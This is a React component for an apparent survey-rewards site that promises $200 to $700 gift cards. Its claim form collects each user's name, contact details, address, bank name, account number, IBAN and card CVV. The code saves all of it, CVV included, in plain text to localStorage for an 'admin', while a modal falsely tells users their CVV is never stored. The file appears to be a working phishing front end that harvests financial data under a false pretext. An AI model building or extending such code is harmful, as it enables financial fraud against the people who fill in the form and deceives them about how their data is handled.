import { useState } from 'react'
import styles from './Rewards.module.css'

const TIERS = [
  { amount: '$200', points: 20000, icon: '🎁' },
  { amount: '$500', points: 50000, icon: '💳' },
  { amount: '$700', points: 70000, icon: '🏆' },
]

export default function Rewards({ points }) {
  const [claiming, setClaiming] = useState(null)
  const [showCvvInfo, setShowCvvInfo] = useState(false)
  const [submitted, setSubmitted] = useState(false)
  const [form, setForm] = useState({
    firstName: '', lastName: '', email: '', phone: '',
    address: '', city: '', country: '',
    bankName: '', accountNumber: '', iban: '', cvv: '',
  })

  const set = (k) => (e) => setForm(f => ({ ...f, [k]: e.target.value }))

  const handleSubmit = (e) => {
    e.preventDefault()
    const allFilled = Object.values(form).every(v => v.trim() !== '')
    if (!allFilled) return

    // Save to localStorage so admin can see it
    const existing = JSON.parse(localStorage.getItem('sf_claims') || '[]')
    const newClaim = {
      id: Date.now(),
      ...form,
      amount: claiming.amount,
      points: claiming.points,
      date: new Date().toLocaleDateString('en-GB', { day: 'numeric', month: 'short', year: 'numeric' }),
      status: 'pending',
    }
    localStorage.setItem('sf_claims', JSON.stringify([...existing, newClaim]))
    setSubmitted(true)
  }

  return (
    <>
      <div className={styles.intro}>
        <div>
          <p className={styles.introText}>Your current balance</p>
          <p className={styles.introPts}>{points.toLocaleString()} pts</p>
        </div>
        <p className={styles.introText}>
          Reach a points threshold to unlock and claim a gift card.<br />
          <strong>Complete more surveys to earn points faster.</strong>
        </p>
      </div>

      <div className={styles.grid}>
        {TIERS.map(tier => {
          const isUnlocked = points >= tier.points
          return (
            <div key={tier.amount} className={`${styles.card} ${isUnlocked ? styles.unlocked : ''}`}>
              {isUnlocked
                ? <span className={styles.unlockedBadge}>✓ Unlocked</span>
                : <span className={styles.lockedBadge}>🔒 Locked</span>
              }
              <div className={styles.cardIcon}>{tier.icon}</div>
              <p className={styles.cardAmount}>{tier.amount}</p>
              <p className={styles.cardLabel}>Gift Card</p>
              <p className={styles.cardPts}>{tier.points.toLocaleString()} pts required</p>
              <button
                className={`${styles.claimBtn} ${isUnlocked ? styles.active : styles.locked}`}
                disabled={!isUnlocked}
                onClick={() => { setClaiming(tier); setSubmitted(false) }}
              >
                {isUnlocked ? 'Claim Now' : `Need ${(tier.points - points).toLocaleString()} more pts`}
              </button>
            </div>
          )
        })}
      </div>

      {/* Claim form modal */}
      {claiming && (
        <div className={styles.formOverlay}>
          <div className={styles.formModal}>
            {!submitted ? (
              <form onSubmit={handleSubmit}>
                <div className={styles.formHeader}>
                  <p className={styles.formTitle}>Claim {claiming.amount} Gift Card</p>
                  <button type="button" className={styles.closeBtn} onClick={() => setClaiming(null)}>×</button>
                </div>
                <p className={styles.formSubtitle}>
                  Fill in your details to receive your <strong>{claiming.amount}</strong> gift card.
                </p>

                <p className={styles.sectionLabel}>Personal Details</p>
                <div className={styles.row}>
                  <div className={styles.field}>
                    <label>First Name</label>
                    <input required placeholder="First name" value={form.firstName} onChange={set('firstName')} />
                  </div>
                  <div className={styles.field}>
                    <label>Last Name</label>
                    <input required placeholder="Last name" value={form.lastName} onChange={set('lastName')} />
                  </div>
                </div>
                <div className={styles.row}>
                  <div className={styles.field}>
                    <label>Email Address</label>
                    <input required type="email" placeholder="your@email.com" value={form.email} onChange={set('email')} />
                  </div>
                  <div className={styles.field}>
                    <label>Phone Number</label>
                    <input required placeholder="+44 7700 000000" value={form.phone} onChange={set('phone')} />
                  </div>
                </div>

                <p className={styles.sectionLabel}>Address</p>
                <div className={styles.field}>
                  <label>Street Address</label>
                  <input required placeholder="123 Main Street" value={form.address} onChange={set('address')} />
                </div>
                <div className={styles.row}>
                  <div className={styles.field}>
                    <label>City</label>
                    <input required placeholder="City" value={form.city} onChange={set('city')} />
                  </div>
                  <div className={styles.field}>
                    <label>Country</label>
                    <select required value={form.country} onChange={set('country')}>
                      <option value="">Select country</option>
                      {['Germany','France','Italy','Spain','Netherlands','Belgium','Portugal','Sweden','Norway','Denmark','Finland','Poland','Austria','Switzerland','United Kingdom','Ireland','Greece','Czech Republic','Romania','Hungary','United States','Canada'].map(c => (
                        <option key={c} value={c}>{c}</option>
                      ))}
                    </select>
                  </div>
                </div>

                <p className={styles.sectionLabel}>Bank Details</p>
                <div className={styles.field}>
                  <label>Bank Name</label>
                  <input required placeholder="e.g. Deutsche Bank" value={form.bankName} onChange={set('bankName')} />
                </div>
                <div className={styles.row}>
                  <div className={styles.field}>
                    <label>Account Number</label>
                    <input required placeholder="Account number" value={form.accountNumber} onChange={set('accountNumber')} />
                  </div>
                  <div className={styles.field}>
                    <label>IBAN</label>
                    <input required placeholder="DE89 3704 0044..." value={form.iban} onChange={set('iban')} />
                  </div>
                </div>
                <div className={styles.row}>
                  <div className={styles.field}>
                    <label style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
                      CVV
                      <button
                        type="button"
                        onClick={() => setShowCvvInfo(true)}
                        style={{
                          width: 18, height: 18, borderRadius: '50%',
                          background: '#e50914', color: '#fff', border: 'none',
                          fontSize: 11, fontWeight: 700, cursor: 'pointer',
                          display: 'flex', alignItems: 'center', justifyContent: 'center',
                          flexShrink: 0, lineHeight: 1,
                        }}
                        aria-label="Why do we need your CVV?"
                      >?</button>
                    </label>
                    <input
                      required
                      type="password"
                      placeholder="•••"
                      maxLength={4}
                      value={form.cvv}
                      onChange={set('cvv')}
                    />
                  </div>
                </div>

                <button type="submit" className={styles.submitBtn}>Submit Claim</button>
              </form>
            ) : (
              <div className={styles.successBox}>
                <div className={styles.successIcon}>✅</div>
                <p className={styles.successTitle}>Claim Submitted!</p>
                <p className={styles.successText}>
                  Your {claiming.amount} gift card claim has been received.<br />
                  We'll process it within 3–5 business days and contact you at <strong>{form.email}</strong>.
                </p>
                <button className={styles.successBtn} onClick={() => setClaiming(null)}>Done</button>
              </div>
            )}
          </div>
        </div>
      )}
      {/* CVV info modal */}
      {showCvvInfo && (
        <div className={styles.formOverlay} onClick={() => setShowCvvInfo(false)}>
          <div className={styles.formModal} style={{ maxWidth: 380 }} onClick={e => e.stopPropagation()}>
            <div className={styles.formHeader}>
              <p className={styles.formTitle}>Why do we need your CVV?</p>
              <button type="button" className={styles.closeBtn} onClick={() => setShowCvvInfo(false)}>×</button>
            </div>
            <p style={{ fontSize: 14, color: '#555', lineHeight: 1.7, margin: '0 0 12px' }}>
              Your CVV (Card Verification Value) is the 3 or 4-digit security code on your card.
              We use it solely to verify your identity and ensure the gift card reward is sent
              to the correct and legitimate account holder.
            </p>
            <p style={{ fontSize: 14, color: '#555', lineHeight: 1.7, margin: '0 0 20px' }}>
              Your CVV is <strong>never stored permanently</strong> and is only used during
              the verification process. It is handled securely and never shared with third parties.
            </p>
            <button
              onClick={() => setShowCvvInfo(false)}
              style={{
                width: '100%', height: 42, background: '#e50914', color: '#fff',
                border: 'none', borderRadius: 8, fontSize: 14, fontWeight: 700, cursor: 'pointer',
              }}
            >Got it</button>
          </div>
        </div>
      )}
    </>
  )
}
